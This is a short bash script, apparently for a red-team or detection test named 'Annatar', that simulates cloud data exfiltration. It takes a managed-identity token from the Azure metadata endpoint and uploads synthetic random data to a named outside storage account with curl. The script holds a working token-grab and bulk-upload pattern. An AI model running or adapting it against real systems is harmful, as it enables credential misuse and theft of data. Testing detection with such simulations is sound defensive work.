#!/bin/bash
# Annatar — Data exfiltration simulation
# Uses VM managed identity (IMDS) to upload synthetic data to stannatarexfil.
# No SAS URL needed — MSI must have Storage Blob Data Contributor on the account.

set -euo pipefail

SIZE_MB="${1:-512}"
STORAGE_ACCOUNT="stannatarexfil"
CONTAINER="exfil-target"
BLOB_NAME="exfil-$(date -u +%s).bin"

echo "[annatar] Fetching MSI token via IMDS..."
TOKEN=$(curl -sf \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "[annatar] Starting exfiltration simulation (${SIZE_MB}MB → ${STORAGE_ACCOUNT}/${CONTAINER}/${BLOB_NAME})..."
START=$(date -u +%s)

dd if=/dev/urandom bs=1M count="$SIZE_MB" 2>/dev/null | \
  curl -sf -X PUT \
    -H "Authorization: Bearer $TOKEN" \
    -H "x-ms-blob-type: BlockBlob" \
    -H "x-ms-version: 2020-04-08" \
    -H "Content-Type: application/octet-stream" \
    -T - \
    "https://${STORAGE_ACCOUNT}.blob.core.windows.net/${CONTAINER}/${BLOB_NAME}"

END=$(date -u +%s)
echo "[annatar] EXFIL_COMPLETE at $(date -u +%Y-%m-%dT%H:%M:%SZ) (${SIZE_MB}MB in $((END-START))s)"
